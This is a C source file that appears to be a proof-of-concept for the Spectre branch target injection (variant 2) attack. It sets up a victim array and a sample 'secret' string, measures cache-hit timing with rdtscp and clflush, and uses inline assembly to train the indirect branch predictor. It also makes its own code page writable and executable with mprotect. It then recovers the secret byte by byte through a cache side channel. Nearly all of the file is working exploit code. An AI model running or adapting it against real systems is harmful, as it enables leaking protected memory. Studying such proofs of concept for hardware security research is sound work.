#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#ifdef _MSC_VER
#include <intrin.h> /* for rdtscp and clflush */
#pragma optimize("gt",on)
#else
#include <x86intrin.h> /* for rdtscp and clflush */
#endif

#include <unistd.h>
#include <sys/mman.h>


/********************************************************************
Victim code.
********************************************************************/
unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[160] = {
  1,
  2,
  3,
  4,
  5,
  6,
  7,
  8,
  9,
  10,
  11,
  12,
  13,
  14,
  15,
  16
};
uint8_t unused2[64];
uint8_t array2[256 * 512];
static int cache_hit_threshold;

char * secret = "This is some sample sensitive data";
char * secret2= "This is some other sample sensitive data";

uint8_t temp = 0; /* Used so compiler won’t optimize out victim_function() */

void victim_function(size_t x) {
  if (x < array1_size) {
    temp &= array2[array1[x] * 512];
  }
}

static int mysqrt(long val)
{
	int root = val / 2, prevroot = 0, i = 0;

	while (prevroot != root && i++ < 100) {
		prevroot = root;
		root = (val / root + root) / 2;
	}

	return root;
}


static inline int
get_access_time(volatile char *addr)
{
	int time1, time2, junk;
	volatile int j;

#if 1
	time1 = __rdtscp(&junk);
	j = *addr;
	//_mm_clflush(addr);
        //_mm_mfence();
	time2 = __rdtscp(&junk);
#else
	time1 = __rdtsc();
	j = *addr;
	_mm_mfence();
	time2 = __rdtsc();
#endif

	return time2 - time1;
}

#define ESTIMATE_CYCLES	1000000
static void
set_cache_hit_threshold(void)
{
	long cached, uncached, i;

	if (0) {
		cache_hit_threshold = 80;
		return;
	}

	for (cached = 0, i = 0; i < ESTIMATE_CYCLES; i++)
		cached += get_access_time(array2);

	for (cached = 0, i = 0; i < ESTIMATE_CYCLES; i++)
		cached += get_access_time(array2);

	for (uncached = 0, i = 0; i < ESTIMATE_CYCLES; i++) {
		_mm_clflush(array2);
		uncached += get_access_time(array2);
	}

	cached /= ESTIMATE_CYCLES;
	uncached /= ESTIMATE_CYCLES;

	cache_hit_threshold = mysqrt(cached * uncached);

	printf("cached = %ld, uncached = %ld, threshold %d\n",
	       cached, uncached, cache_hit_threshold);
}


/********************************************************************
Analysis code
********************************************************************/
#define CACHE_HIT_THRESHOLD (79) /* assume cache hit if time <= threshold */

void indirect_call(void **dst, void *target_addr, void *probe)
{
	__asm__ (
		"mov %1, %%rdi \n\t"
		"mov %2, %%rsi \n\t"
		"clflush (%0) \n\t"
		"mov (%0), %%rax \n\t"
		"call *(%%rax) \n\t"
		:
		:"r"(dst), "r"(target_addr), "r"(probe)
		:"rax","rdi","rsi"
	);
}

void touch_and_break(void *target_addr, void *probe)
{
	__asm__ (
		"1:"
		"movzxb (%0), %%eax \n\t"
		"shl $9, %%rax \n\t"
		"add %1, %%rax \n\t"
		"movq (%%rax), %%rbx \n\t"
		"jmp 1b \n\t"
		:
		:"r"(target_addr), "r"(probe)
		:"rax","rbx"
	);
}


void do_nothing(void* a, void* b)
{
}

char JailbreakMemoryPage(void *page)
{
	int ret = 0;
	ret = mprotect((void *)((long)page & (~0xfff)), 256, PROT_READ | PROT_WRITE | PROT_EXEC);
	return 1;
}

void branch_target_injection(void *target_address) {
  static int results[256];
  uint8_t value[2];
  int score[2];
  int i,trial,x,l;
  uint8_t train_and_attack[6] = {0};
  train_and_attack[5] = 1;

  uint8_t original_prologue = *(uint8_t *)(touch_and_break);
  void (*target_proc)(void*, void*) = NULL;
  void *call_destination = (void *)(&target_proc);

  for (i = 0; i < 256; i++)
    results[i] = 0;

  for (trial = 0; trial < 999; ++trial) {
    for (i = 0; i < 256; i++)
      _mm_clflush(&array2[i * 512]);

    for (l = 0; l < 10; l++) {
      for (i = 0; i < 6; i++) {
        x = train_and_attack[i];
        *(uint8_t *)(touch_and_break) = (x ? original_prologue : 0xC3);
        target_proc = (x ? do_nothing : touch_and_break);
        indirect_call(&call_destination, target_address, array2);
      }
    }
    int mix_i;
    long time;
    for (i = 0; i < 256; i++) {
      mix_i = ((i * 167) + 13) & 255;
      time = get_access_time(&array2[mix_i * 512]);
      if (time < cache_hit_threshold && mix_i != array1[trial % array1_size]) {
          results[mix_i]++;
      }
    }
  }
  int j,k;
  j = k = -1;
  for (i = 0; i < 256; i++) {
    if (j < 0 || results[i] >= results[j]) {
      k = j;
      j = i;
    } else if (k < 0 || results[i] >= results[k]) {
      k = i;
    }
  }
  results[0] ^= 0; /* use junk so code above won’t get optimized out*/
  value[0] = (uint8_t) j;
  score[0] = results[j];
  value[1] = (uint8_t) k;
  score[1] = results[k];
  printf("guess = %c expect = %c\n", j, *(char *)target_address);
}


int main(int argc,
  const char * * argv) {
  size_t malicious_x = (size_t)(secret - (char * ) array1); /* default for malicious_x */
  int i, score[2], len = 100;
  uint8_t value[2];

  for (i = 0; i < sizeof(array2); i++)
    array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */
  if (argc == 3) {
    sscanf(argv[1], "%p", (void * * )( & malicious_x));
    malicious_x -= (size_t) array1; /* Convert input value into a pointer */
    sscanf(argv[2], "%d", & len);
  }

  printf("secret address = %p\n", secret);
  printf("secret2 address = %p\n", secret2);
  printf("array2 address = %p\n", array2);
  set_cache_hit_threshold();

  if (JailbreakMemoryPage(touch_and_break)) {
	while (--len >= 0) {
	    branch_target_injection(secret++);
  	}
        
  }
  return (0);
}
